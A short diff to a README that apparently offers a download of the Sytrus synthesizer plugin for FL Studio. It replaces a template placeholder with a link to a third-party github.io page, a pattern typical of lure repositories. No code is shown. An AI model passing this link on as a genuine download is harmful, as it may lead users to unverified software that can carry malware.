@@ -2,7 +2,7 @@
 
 A high-performance synthesizer plugin for FL Studio users, combining multiple synthesis techniques including FM, RM, Subtractive, and Additive. Sytrus is built for electronic music producers and professional sound designers seeking advanced modulation and dynamic layering.
 
-[![Download](https://img.shields.io/badge/Download-Sytrus_for_FL_Studio-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Sytrus_for_FL_Studio-blueviolet)](https://sytrus-fl-studio-plugin.github.io/.github)
 
 ---
 
